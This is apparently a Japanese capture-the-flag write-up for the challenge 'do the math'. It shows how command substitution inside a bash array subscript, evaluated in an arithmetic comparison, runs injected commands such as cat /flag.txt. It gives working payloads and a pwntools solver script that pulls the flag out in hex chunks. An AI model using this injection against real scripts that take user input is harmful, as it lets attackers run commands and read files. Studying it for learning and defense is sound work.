# do the math

## / Overview

配列添字のシェル展開

## / Writeup

チャレンジの内容は以下のとおりです．

```sh
#!/bin/bash
SECRET=$((RANDOM % 1000))
echo "Guess my number (0-999):"
read -r GUESS
if [[ "$GUESS" -eq "$SECRET" ]]; then
    echo "Correct!"
else
    echo "Wrong! It was $SECRET."
fi
```

変数`GUESS`にユーザの入力が入るので，どうにかして`/flag.txt`の内容を表示させます．

まず，変数`SECRET`にフラグの中身を代入できないか考えました．いくつか試していると，数式の代入が可能であることが分かりました．

```sh
$ nc 34.170.146.252 21406
Guess my number (0-999):
SECRET=3+3
Wrong! It was 6.
```

ではコマンドの実行結果を代入することはできるでしょうか．`$(cat</flag.txt)`を`SECRET`に代入するコードを書いてみます．

```sh
$ nc 34.170.146.252 21406
Guess my number (0-999):
SECRET=($(cat /flag.txt))
/app/chall.sh: line 5: [[: SECRET=($(cat /flag.txt)): syntax error: operand expected (error token is "$(cat /flag.txt))")
Wrong! It was 668.
```

そもそもコマンドとして認識されていなさそうです．調べてみるとこの条件文の中では算術式しか許可されないようで，それなら算術式の中でもコマンドを実行できる方法を調べるしかありません．そこで以下の記事を見つけました．

> Bash $((算術式)) のすべて - A 基本編
>
> https://qiita.com/akinomyoga/items/9761031c551d43307374#a34-%E9%85%8D%E5%88%97%E8%A6%81%E7%B4%A0

配列のインデックスを指定するときだけ，中でコマンドが実行されるようです．例では次のような構文が挙げられていました．

```sh
arr=(111 222 333)
index=0
echo $((index=2,arr[$(echo $index)])) # 結果: 111
```

ということは，`[]`の中に`SECRET=($(cat /flag.txt))`を入れたら成功するでしょうか．

```sh
$ nc 34.170.146.252 21406
Guess my number (0-999):
arr[SECRET=($(cat /flag.txt))]
/app/chall.sh: line 5: SECRET=(Alpaca{...}): syntax error: invalid arithmetic operator (error token is "{...})")
```

エラーにフラグを出力させることに成功しました．なら`SECRET`に代入する必要もないので最小ペイロードは次のようになります．

```sh
$ nc 34.170.146.252 21406
Guess my number (0-999):
_[$(cat /flag.txt)]
/app/chall.sh: line 5: Alpaca{...}: syntax error: invalid arithmetic operator (error token is "{...}")
```

### 別解

どうにか`SECRET`に代入してエラー無しで答えを吐かせたい！という人（ぼく）のために別解を考えました．`SECRET`には10進数しか代入できないので，フラグをASCIIとして16進数に変えた後，8バイトずつ順番に切り出して，最後に10進数に変換して代入します．

```sh
a[SECRET=16#$(cat /flag.txt|od -An -tx1|tr -d ' \n'|tail -c +1|head -c 16)]
Wrong! It was 4714266473531538274.
a[SECRET=16#$(cat /flag.txt|od -An -tx1|tr -d ' \n'|tail -c +17|head -c 16)] # tailは16刻み
Wrong! It was 3779479271160033652.

...

a[SECRET=16#$(cat /flag.txt|od -An -tx1|tr -d ' \n'|tail -c +65|head -c 16)]
Wrong! It was 29309.
```

この数字をバイトに変換し，ASCII変換するとフラグになります．以下が，その流れを自動化した`solver.py`になります．

```py
from pwn import *
from Crypto.Util.number import long_to_bytes
context.log_level = 'error'

f, i = "", 1
while "}" not in f:
    p = remote('34.170.146.252', 21406)
    p.sendlineafter(b"Guess my number (0-999):", f"a[SECRET=16#$(cat /flag.txt|od -An -tx1|tr -d ' \\n'|tail -c +{i}|head -c 16)]".encode())
    h = p.recvall().decode().split()[-1][:-1]
    f += long_to_bytes(int(h, 10)).decode()
    i += 16
    
print(f)
```

